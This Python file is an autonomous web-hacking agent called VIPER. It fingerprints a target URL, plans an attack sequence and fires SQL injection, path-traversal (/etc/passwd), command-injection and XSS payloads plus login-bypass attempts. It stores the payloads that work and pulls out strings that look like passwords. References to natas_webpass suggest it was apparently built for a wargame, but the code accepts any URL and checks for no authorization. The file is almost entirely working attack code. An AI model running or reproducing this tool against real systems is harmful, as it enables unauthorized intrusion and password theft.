#!/usr/bin/env python3
"""
VIPER Autonomous Hacking Agent
================================
Self-directing attack loop with learning feedback.

Architecture:
1. Target Analyzer - Understand what we're attacking
2. Attack Planner - Decide attack sequence
3. Executor - Run attacks with error handling
4. Learner - Update knowledge from results
5. Reporter - Generate findings

Author: VIPER Contributors
"""

import json
import re
import time
import hashlib
import urllib.request
import urllib.parse
import base64
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum

class AttackType(Enum):
    RECON = "recon"
    SOURCE_ANALYSIS = "source_analysis"
    LFI = "lfi"
    SQLI = "sqli"
    COMMAND_INJECTION = "cmdi"
    XSS = "xss"
    AUTH_BYPASS = "auth_bypass"
    SESSION = "session"
    CRYPTO = "crypto"
    FILE_UPLOAD = "file_upload"
    DESERIALIZATION = "deserialization"
    SSRF = "ssrf"
    XXE = "xxe"

@dataclass
class Target:
    url: str
    credentials: Optional[Tuple[str, str]] = None
    headers: Dict[str, str] = field(default_factory=dict)
    scope: List[str] = field(default_factory=list)
    discovered_endpoints: List[str] = field(default_factory=list)
    technologies: List[str] = field(default_factory=list)

@dataclass 
class AttackResult:
    attack_type: AttackType
    payload: str
    success: bool
    response: str
    extracted_data: Optional[str] = None
    confidence: float = 0.0
    notes: str = ""

@dataclass
class Finding:
    vulnerability: str
    severity: str  # critical, high, medium, low, info
    endpoint: str
    payload: str
    evidence: str
    reproduction_steps: List[str]
    impact: str
    remediation: str

class KnowledgeBase:
    """Persistent learning storage"""
    
    def __init__(self, path: str = "knowledge/learned_patterns.json"):
        self.path = Path(path)
        self.path.parent.mkdir(parents=True, exist_ok=True)
        self.patterns = self._load()
    
    def _load(self) -> Dict:
        if self.path.exists():
            return json.loads(self.path.read_text())
        return {
            "successful_payloads": {},
            "failed_payloads": {},
            "indicators": {},
            "bypass_techniques": {},
            "tech_fingerprints": {}
        }
    
    def save(self):
        self.path.write_text(json.dumps(self.patterns, indent=2))
    
    def record_success(self, attack_type: str, payload: str, context: str):
        key = attack_type
        if key not in self.patterns["successful_payloads"]:
            self.patterns["successful_payloads"][key] = []
        self.patterns["successful_payloads"][key].append({
            "payload": payload,
            "context": context,
            "timestamp": datetime.now().isoformat()
        })
        self.save()
    
    def record_failure(self, attack_type: str, payload: str, error: str):
        key = attack_type
        if key not in self.patterns["failed_payloads"]:
            self.patterns["failed_payloads"][key] = []
        # Only keep last 100 failures per type
        self.patterns["failed_payloads"][key].append({
            "payload": payload,
            "error": error[:200]
        })
        self.patterns["failed_payloads"][key] = self.patterns["failed_payloads"][key][-100:]
        self.save()
    
    def get_best_payloads(self, attack_type: str) -> List[str]:
        """Get payloads that worked before for this attack type"""
        if attack_type in self.patterns["successful_payloads"]:
            return [p["payload"] for p in self.patterns["successful_payloads"][attack_type]]
        return []

class TargetAnalyzer:
    """Analyze target to understand attack surface"""
    
    def __init__(self, target: Target):
        self.target = target
    
    def _request(self, url: str, method: str = "GET", data: Optional[bytes] = None) -> Tuple[int, str, Dict]:
        """Make HTTP request to target"""
        req = urllib.request.Request(url, data=data, method=method)
        
        if self.target.credentials:
            creds = base64.b64encode(f"{self.target.credentials[0]}:{self.target.credentials[1]}".encode()).decode()
            req.add_header('Authorization', f'Basic {creds}')
        
        for k, v in self.target.headers.items():
            req.add_header(k, v)
        
        try:
            resp = urllib.request.urlopen(req, timeout=30)
            return resp.status, resp.read().decode('utf-8', errors='ignore'), dict(resp.headers)
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers)
        except Exception as e:
            return 0, str(e), {}
    
    def analyze(self) -> Dict:
        """Full target analysis"""
        status, body, headers = self._request(self.target.url)
        
        analysis = {
            "status": status,
            "technologies": self._detect_tech(body, headers),
            "forms": self._find_forms(body),
            "links": self._find_links(body),
            "parameters": self._find_params(body),
            "interesting_paths": [],
            "source_hints": self._find_source_hints(body)
        }
        
        # Check common paths
        common_paths = ['/robots.txt', '/sitemap.xml', '/.git/HEAD', '/index-source.html', 
                       '/source.php', '/.htaccess', '/admin/', '/login', '/api/']
        
        for path in common_paths:
            check_url = urllib.parse.urljoin(self.target.url, path)
            s, b, _ = self._request(check_url)
            if s == 200 and len(b) > 0:
                analysis["interesting_paths"].append(path)
        
        return analysis
    
    def _detect_tech(self, body: str, headers: Dict) -> List[str]:
        tech = []
        
        # Server header
        if 'Server' in headers:
            tech.append(headers['Server'])
        
        # PHP indicators
        if 'PHPSESSID' in str(headers) or '.php' in body:
            tech.append('PHP')
        
        # Perl indicators  
        if '.pl' in body or '.cgi' in body:
            tech.append('Perl/CGI')
        
        # Framework detection
        if 'laravel' in body.lower():
            tech.append('Laravel')
        if 'django' in body.lower():
            tech.append('Django')
        if 'express' in body.lower():
            tech.append('Express.js')
            
        return tech
    
    def _find_forms(self, body: str) -> List[Dict]:
        forms = []
        form_pattern = r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>'
        for match in re.finditer(form_pattern, body, re.DOTALL | re.IGNORECASE):
            action = match.group(1)
            form_html = match.group(2)
            
            inputs = []
            for inp in re.finditer(r'<input[^>]*name=["\']([^"\']*)["\'][^>]*>', form_html, re.IGNORECASE):
                inputs.append(inp.group(1))
            
            forms.append({"action": action, "inputs": inputs})
        return forms
    
    def _find_links(self, body: str) -> List[str]:
        links = re.findall(r'href=["\']([^"\']*)["\']', body, re.IGNORECASE)
        return list(set(links))[:20]  # Limit
    
    def _find_params(self, body: str) -> List[str]:
        # Find URL parameters
        params = re.findall(r'[?&]([a-zA-Z_][a-zA-Z0-9_]*)=', body)
        # Find form input names
        inputs = re.findall(r'name=["\']([a-zA-Z_][a-zA-Z0-9_]*)["\']', body, re.IGNORECASE)
        return list(set(params + inputs))
    
    def _find_source_hints(self, body: str) -> List[str]:
        hints = []
        # Comments
        comments = re.findall(r'<!--(.*?)-->', body, re.DOTALL)
        for c in comments:
            if len(c.strip()) > 5:
                hints.append(f"Comment: {c.strip()[:100]}")
        
        # Include hints
        if 'include' in body.lower() or 'require' in body.lower():
            hints.append("PHP include detected")
        
        # Viewsource links
        if 'source' in body.lower():
            hints.append("Source code may be available")
            
        return hints

class AttackPlanner:
    """Decide attack sequence based on target analysis"""
    
    def __init__(self, knowledge: KnowledgeBase):
        self.knowledge = knowledge
        
        # Attack priority based on common success rates
        self.attack_priority = [
            AttackType.RECON,
            AttackType.SOURCE_ANALYSIS,
            AttackType.AUTH_BYPASS,
            AttackType.SQLI,
            AttackType.LFI,
            AttackType.COMMAND_INJECTION,
            AttackType.FILE_UPLOAD,
            AttackType.XSS,
            AttackType.SESSION,
            AttackType.DESERIALIZATION,
            AttackType.CRYPTO,
            AttackType.SSRF,
            AttackType.XXE
        ]
    
    def plan(self, analysis: Dict) -> List[Tuple[AttackType, Dict]]:
        """Create attack plan based on analysis"""
        plan = []
        
        # Always start with recon
        plan.append((AttackType.RECON, {"paths": analysis.get("interesting_paths", [])}))
        
        # Check for source code
        if any('source' in h.lower() for h in analysis.get("source_hints", [])):
            plan.append((AttackType.SOURCE_ANALYSIS, {}))
        
        # If forms exist, try auth bypass and SQLi
        forms = analysis.get("forms", [])
        if forms:
            for form in forms:
                if any(x in str(form).lower() for x in ['login', 'user', 'pass', 'auth']):
                    plan.append((AttackType.AUTH_BYPASS, {"form": form}))
                    plan.append((AttackType.SQLI, {"form": form}))
        
        # If parameters exist, try injection
        params = analysis.get("parameters", [])
        if params:
            # Check for file-related params
            file_params = [p for p in params if any(x in p.lower() for x in ['file', 'page', 'path', 'doc', 'load', 'read'])]
            if file_params:
                plan.append((AttackType.LFI, {"params": file_params}))
            
            # Check for command-related params
            cmd_params = [p for p in params if any(x in p.lower() for x in ['cmd', 'exec', 'run', 'query', 'search', 'grep'])]
            if cmd_params:
                plan.append((AttackType.COMMAND_INJECTION, {"params": cmd_params}))
            
            # Generic injection on all params
            plan.append((AttackType.SQLI, {"params": params}))
            plan.append((AttackType.XSS, {"params": params}))
        
        # Technology-specific attacks
        tech = analysis.get("technologies", [])
        if 'PHP' in str(tech):
            plan.append((AttackType.DESERIALIZATION, {}))
            plan.append((AttackType.FILE_UPLOAD, {}))
        
        if 'Perl' in str(tech) or 'CGI' in str(tech):
            plan.append((AttackType.COMMAND_INJECTION, {"perl_mode": True}))
        
        return plan

class AttackExecutor:
    """Execute attacks against target"""
    
    def __init__(self, target: Target, knowledge: KnowledgeBase):
        self.target = target
        self.knowledge = knowledge
        self.payloads = self._load_payloads()
    
    def _load_payloads(self) -> Dict[str, List[str]]:
        """Load attack payloads"""
        return {
            "sqli": [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "\" OR \"1\"=\"1",
                "' OR 1=1 --",
                "admin'--",
                "1' AND '1'='1",
                "1 UNION SELECT 1,2,3--",
            ],
            "lfi": [
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "/etc/passwd",
                "..\\..\\..\\etc\\passwd",
                "....//....//....//etc/natas_webpass/",
                "/etc/natas_webpass/",
                "php://filter/convert.base64-encode/resource=",
            ],
            "cmdi": [
                "; id",
                "| id",
                "$(id)",
                "`id`",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "$(cat /etc/passwd)",
            ],
            "xss": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)",
                "<svg onload=alert(1)>",
            ],
            "auth_bypass": [
                ("admin", "admin"),
                ("admin", "' OR '1'='1"),
                ("admin'--", "anything"),
                ("' OR '1'='1'--", "x"),
            ]
        }
    
    def _request(self, url: str, method: str = "GET", data: Optional[Dict] = None, 
                 headers: Optional[Dict] = None) -> Tuple[int, str]:
        """Make HTTP request"""
        req_headers = dict(self.target.headers)
        if headers:
            req_headers.update(headers)
        
        if data:
            encoded = urllib.parse.urlencode(data).encode()
        else:
            encoded = None
        
        req = urllib.request.Request(url, data=encoded, method=method)
        
        if self.target.credentials:
            creds = base64.b64encode(f"{self.target.credentials[0]}:{self.target.credentials[1]}".encode()).decode()
            req.add_header('Authorization', f'Basic {creds}')
        
        for k, v in req_headers.items():
            req.add_header(k, v)
        
        if encoded:
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
        
        try:
            resp = urllib.request.urlopen(req, timeout=30)
            return resp.status, resp.read().decode('utf-8', errors='ignore')
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode('utf-8', errors='ignore')
        except Exception as e:
            return 0, str(e)
    
    def execute(self, attack_type: AttackType, context: Dict) -> List[AttackResult]:
        """Execute an attack type and return results"""
        results = []
        
        if attack_type == AttackType.SQLI:
            results = self._attack_sqli(context)
        elif attack_type == AttackType.LFI:
            results = self._attack_lfi(context)
        elif attack_type == AttackType.COMMAND_INJECTION:
            results = self._attack_cmdi(context)
        elif attack_type == AttackType.AUTH_BYPASS:
            results = self._attack_auth(context)
        elif attack_type == AttackType.XSS:
            results = self._attack_xss(context)
        elif attack_type == AttackType.SOURCE_ANALYSIS:
            results = self._analyze_source(context)
        elif attack_type == AttackType.RECON:
            results = self._recon(context)
        
        # Learn from results
        for r in results:
            if r.success:
                self.knowledge.record_success(attack_type.value, r.payload, str(context)[:100])
            else:
                self.knowledge.record_failure(attack_type.value, r.payload, r.response[:100])
        
        return results
    
    def _attack_sqli(self, context: Dict) -> List[AttackResult]:
        results = []
        payloads = self.knowledge.get_best_payloads("sqli") + self.payloads["sqli"]
        
        params = context.get("params", [])
        form = context.get("form", {})
        
        # Attack form
        if form:
            action = form.get("action", "")
            inputs = form.get("inputs", [])
            url = urllib.parse.urljoin(self.target.url, action)
            
            for payload in payloads[:10]:  # Limit attempts
                for inp in inputs:
                    data = {i: "test" for i in inputs}
                    data[inp] = payload
                    
                    status, body = self._request(url, "POST", data)
                    
                    success = self._detect_sqli_success(body, payload)
                    results.append(AttackResult(
                        attack_type=AttackType.SQLI,
                        payload=f"{inp}={payload}",
                        success=success,
                        response=body[:500],
                        confidence=0.8 if success else 0.0
                    ))
                    
                    if success:
                        return results  # Found it!
        
        # Attack URL params
        for param in params[:5]:
            for payload in payloads[:5]:
                test_url = f"{self.target.url}?{param}={urllib.parse.quote(payload)}"
                status, body = self._request(test_url)
                
                success = self._detect_sqli_success(body, payload)
                results.append(AttackResult(
                    attack_type=AttackType.SQLI,
                    payload=f"{param}={payload}",
                    success=success,
                    response=body[:500]
                ))
                
                if success:
                    return results
        
        return results
    
    def _detect_sqli_success(self, body: str, payload: str) -> bool:
        # Look for SQL errors
        sql_errors = ['sql', 'mysql', 'sqlite', 'postgresql', 'oracle', 'syntax error',
                      'query failed', 'database error', 'you have an error']
        for err in sql_errors:
            if err in body.lower():
                return True
        
        # Look for data leakage indicators
        if 'password' in body.lower() and 'password' not in payload.lower():
            return True
        
        # Look for successful auth bypass
        if any(x in body.lower() for x in ['welcome', 'logged in', 'success', 'admin']):
            return True
        
        return False
    
    def _attack_lfi(self, context: Dict) -> List[AttackResult]:
        results = []
        payloads = self.knowledge.get_best_payloads("lfi") + self.payloads["lfi"]
        params = context.get("params", ["file", "page", "path"])
        
        for param in params[:3]:
            for payload in payloads:
                test_url = f"{self.target.url}?{param}={urllib.parse.quote(payload)}"
                status, body = self._request(test_url)
                
                success = self._detect_lfi_success(body)
                extracted = None
                
                if success:
                    # Try to extract password
                    pwd_match = re.search(r'[A-Za-z0-9]{32}', body)
                    if pwd_match:
                        extracted = pwd_match.group(0)
                
                results.append(AttackResult(
                    attack_type=AttackType.LFI,
                    payload=f"{param}={payload}",
                    success=success,
                    response=body[:500],
                    extracted_data=extracted
                ))
                
                if success:
                    return results
        
        return results
    
    def _detect_lfi_success(self, body: str) -> bool:
        indicators = ['root:', 'bin:', '/bin/bash', '/bin/sh', 'natas', 
                      '<?php', 'include', 'require', 'Warning:', 'failed to open']
        return any(ind in body for ind in indicators)
    
    def _attack_cmdi(self, context: Dict) -> List[AttackResult]:
        results = []
        payloads = self.knowledge.get_best_payloads("cmdi") + self.payloads["cmdi"]
        params = context.get("params", ["cmd", "exec", "query"])
        
        # Add Perl-specific payloads
        if context.get("perl_mode"):
            payloads = [
                "|cat /etc/passwd",
                "; cat /etc/passwd",
                "| id |",
                "cat /etc/passwd |",  # Perl open() trick
            ] + payloads
        
        for param in params[:3]:
            for payload in payloads[:10]:
                test_url = f"{self.target.url}?{param}={urllib.parse.quote(payload)}"
                status, body = self._request(test_url)
                
                success = self._detect_cmdi_success(body)
                results.append(AttackResult(
                    attack_type=AttackType.COMMAND_INJECTION,
                    payload=f"{param}={payload}",
                    success=success,
                    response=body[:500]
                ))
                
                if success:
                    return results
        
        return results
    
    def _detect_cmdi_success(self, body: str) -> bool:
        indicators = ['uid=', 'gid=', 'root:', 'bin:', '/bin/bash', 
                      'www-data', 'natas', 'Linux', 'Darwin']
        return any(ind in body for ind in indicators)
    
    def _attack_auth(self, context: Dict) -> List[AttackResult]:
        results = []
        form = context.get("form", {})
        
        if not form:
            return results
        
        action = form.get("action", "")
        inputs = form.get("inputs", [])
        url = urllib.parse.urljoin(self.target.url, action)
        
        user_fields = [i for i in inputs if any(x in i.lower() for x in ['user', 'name', 'login', 'email'])]
        pass_fields = [i for i in inputs if any(x in i.lower() for x in ['pass', 'pwd', 'secret'])]
        
        if not user_fields or not pass_fields:
            return results
        
        user_field = user_fields[0]
        pass_field = pass_fields[0]
        
        for user, pwd in self.payloads["auth_bypass"]:
            data = {user_field: user, pass_field: pwd}
            status, body = self._request(url, "POST", data)
            
            success = any(x in body.lower() for x in ['welcome', 'success', 'logged', 'dashboard', 'admin'])
            success = success and 'invalid' not in body.lower() and 'error' not in body.lower()
            
            results.append(AttackResult(
                attack_type=AttackType.AUTH_BYPASS,
                payload=f"{user_field}={user}&{pass_field}={pwd}",
                success=success,
                response=body[:500]
            ))
            
            if success:
                return results
        
        return results
    
    def _attack_xss(self, context: Dict) -> List[AttackResult]:
        results = []
        payloads = self.payloads["xss"]
        params = context.get("params", [])
        
        for param in params[:3]:
            for payload in payloads:
                test_url = f"{self.target.url}?{param}={urllib.parse.quote(payload)}"
                status, body = self._request(test_url)
                
                # Check if payload is reflected
                success = payload in body or payload.replace('<', '&lt;') not in body and '<script' in body
                
                results.append(AttackResult(
                    attack_type=AttackType.XSS,
                    payload=f"{param}={payload}",
                    success=success,
                    response=body[:500]
                ))
        
        return results
    
    def _analyze_source(self, context: Dict) -> List[AttackResult]:
        results = []
        
        # Try common source endpoints
        source_paths = [
            'index-source.html', 'source.php', 'index.phps', 
            'index.php.bak', 'index.php~', '.index.php.swp'
        ]
        
        for path in source_paths:
            url = urllib.parse.urljoin(self.target.url, path)
            status, body = self._request(url)
            
            if status == 200 and len(body) > 100:
                # Look for interesting patterns
                patterns = {
                    'password_check': r'password|passwd|pwd|secret',
                    'sql_query': r'SELECT|INSERT|UPDATE|DELETE|mysql|sqlite',
                    'file_ops': r'include|require|fopen|file_get|readfile',
                    'exec': r'exec|system|passthru|shell_exec|eval',
                    'serialize': r'serialize|unserialize|__wakeup|__destruct',
                }
                
                findings = []
                for name, pattern in patterns.items():
                    if re.search(pattern, body, re.IGNORECASE):
                        findings.append(name)
                
                if findings:
                    results.append(AttackResult(
                        attack_type=AttackType.SOURCE_ANALYSIS,
                        payload=path,
                        success=True,
                        response=body[:1000],
                        notes=f"Found: {', '.join(findings)}"
                    ))
        
        return results
    
    def _recon(self, context: Dict) -> List[AttackResult]:
        results = []
        paths = context.get("paths", [])
        
        for path in paths:
            url = urllib.parse.urljoin(self.target.url, path)
            status, body = self._request(url)
            
            if status == 200:
                results.append(AttackResult(
                    attack_type=AttackType.RECON,
                    payload=path,
                    success=True,
                    response=body[:500],
                    notes=f"Found: {path} ({len(body)} bytes)"
                ))
        
        return results

class VIPERAgent:
    """
    Main autonomous hacking agent
    
    Usage:
        agent = VIPERAgent()
        findings = agent.attack("http://target.com", credentials=("user", "pass"))
    """
    
    def __init__(self, knowledge_path: str = None):
        base_path = Path(__file__).parent.parent
        if knowledge_path is None:
            knowledge_path = str(base_path / "knowledge" / "learned_patterns.json")
        
        self.knowledge = KnowledgeBase(knowledge_path)
        self.findings: List[Finding] = []
        self.session_log: List[str] = []
    
    def log(self, msg: str):
        timestamp = datetime.now().strftime("%H:%M:%S")
        entry = f"[{timestamp}] {msg}"
        self.session_log.append(entry)
        print(entry, flush=True)
    
    def attack(self, url: str, credentials: Optional[Tuple[str, str]] = None,
               max_attempts: int = 50) -> List[Finding]:
        """
        Autonomous attack on target
        
        Args:
            url: Target URL
            credentials: Optional (username, password) tuple
            max_attempts: Maximum attack attempts before stopping
        
        Returns:
            List of findings
        """
        self.log(f"🎯 VIPER targeting: {url}")
        
        # Create target
        target = Target(url=url, credentials=credentials)
        
        # Phase 1: Analyze
        self.log("📡 Phase 1: Target Analysis")
        analyzer = TargetAnalyzer(target)
        analysis = analyzer.analyze()
        
        self.log(f"  Technologies: {analysis.get('technologies', [])}")
        self.log(f"  Forms: {len(analysis.get('forms', []))}")
        self.log(f"  Parameters: {analysis.get('parameters', [])}")
        self.log(f"  Interesting paths: {analysis.get('interesting_paths', [])}")
        
        # Phase 2: Plan
        self.log("🧠 Phase 2: Attack Planning")
        planner = AttackPlanner(self.knowledge)
        plan = planner.plan(analysis)
        self.log(f"  Planned attacks: {[p[0].value for p in plan]}")
        
        # Phase 3: Execute
        self.log("⚔️ Phase 3: Executing Attacks")
        executor = AttackExecutor(target, self.knowledge)
        
        attempts = 0
        for attack_type, context in plan:
            if attempts >= max_attempts:
                self.log(f"  ⚠️ Max attempts ({max_attempts}) reached")
                break
            
            self.log(f"  🔥 Trying: {attack_type.value}")
            results = executor.execute(attack_type, context)
            attempts += len(results)
            
            successes = [r for r in results if r.success]
            if successes:
                self.log(f"  ✅ SUCCESS! Found {len(successes)} hits")
                for s in successes:
                    self.log(f"    Payload: {s.payload[:50]}")
                    if s.extracted_data:
                        self.log(f"    📦 Extracted: {s.extracted_data}")
                    
                    # Create finding
                    finding = Finding(
                        vulnerability=attack_type.value,
                        severity=self._assess_severity(attack_type),
                        endpoint=url,
                        payload=s.payload,
                        evidence=s.response[:200],
                        reproduction_steps=[f"Send payload: {s.payload}"],
                        impact=self._assess_impact(attack_type),
                        remediation=self._get_remediation(attack_type)
                    )
                    self.findings.append(finding)
        
        # Phase 4: Report
        self.log(f"📋 Phase 4: Complete - {len(self.findings)} findings")
        
        return self.findings
    
    def _assess_severity(self, attack_type: AttackType) -> str:
        severity_map = {
            AttackType.SQLI: "critical",
            AttackType.COMMAND_INJECTION: "critical",
            AttackType.DESERIALIZATION: "critical",
            AttackType.LFI: "high",
            AttackType.AUTH_BYPASS: "high",
            AttackType.FILE_UPLOAD: "high",
            AttackType.SSRF: "high",
            AttackType.XXE: "high",
            AttackType.XSS: "medium",
            AttackType.SESSION: "medium",
            AttackType.CRYPTO: "medium",
            AttackType.RECON: "info",
            AttackType.SOURCE_ANALYSIS: "info",
        }
        return severity_map.get(attack_type, "medium")
    
    def _assess_impact(self, attack_type: AttackType) -> str:
        impact_map = {
            AttackType.SQLI: "Database compromise, data exfiltration, authentication bypass",
            AttackType.COMMAND_INJECTION: "Remote code execution, full system compromise",
            AttackType.LFI: "Sensitive file disclosure, potential RCE via log poisoning",
            AttackType.AUTH_BYPASS: "Unauthorized access to protected resources",
            AttackType.XSS: "Session hijacking, credential theft, defacement",
        }
        return impact_map.get(attack_type, "Security impact varies")
    
    def _get_remediation(self, attack_type: AttackType) -> str:
        remediation_map = {
            AttackType.SQLI: "Use parameterized queries/prepared statements",
            AttackType.COMMAND_INJECTION: "Avoid shell execution, use safe APIs, whitelist input",
            AttackType.LFI: "Whitelist allowed files, avoid user input in file paths",
            AttackType.AUTH_BYPASS: "Use secure authentication, parameterized queries",
            AttackType.XSS: "Encode output, use CSP headers, validate input",
        }
        return remediation_map.get(attack_type, "Follow secure coding practices")
    
    def generate_report(self, output_path: str = None) -> str:
        """Generate markdown report of findings"""
        report = ["# VIPER Autonomous Scan Report", ""]
        report.append(f"**Scan Date:** {datetime.now().isoformat()}")
        report.append(f"**Total Findings:** {len(self.findings)}")
        report.append("")
        
        # Summary by severity
        report.append("## Summary")
        severities = {}
        for f in self.findings:
            severities[f.severity] = severities.get(f.severity, 0) + 1
        for sev in ['critical', 'high', 'medium', 'low', 'info']:
            if sev in severities:
                report.append(f"- **{sev.upper()}:** {severities[sev]}")
        report.append("")
        
        # Detailed findings
        report.append("## Findings")
        for i, f in enumerate(self.findings, 1):
            report.append(f"### {i}. {f.vulnerability.upper()} [{f.severity.upper()}]")
            report.append(f"**Endpoint:** `{f.endpoint}`")
            report.append(f"**Payload:** `{f.payload}`")
            report.append(f"**Impact:** {f.impact}")
            report.append(f"**Evidence:**")
            report.append(f"```\n{f.evidence}\n```")
            report.append(f"**Remediation:** {f.remediation}")
            report.append("")
        
        # Session log
        report.append("## Session Log")
        report.append("```")
        report.extend(self.session_log)
        report.append("```")
        
        report_text = "\n".join(report)
        
        if output_path:
            Path(output_path).write_text(report_text)
        
        return report_text


# CLI interface
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python autonomous_agent.py <url> [username] [password]")
        print("Example: python autonomous_agent.py http://target.com admin secret123")
        sys.exit(1)
    
    url = sys.argv[1]
    creds = None
    if len(sys.argv) >= 4:
        creds = (sys.argv[2], sys.argv[3])
    
    agent = VIPERAgent()
    findings = agent.attack(url, credentials=creds)
    
    # Generate report
    report = agent.generate_report()
    print("\n" + "="*50)
    print(report)
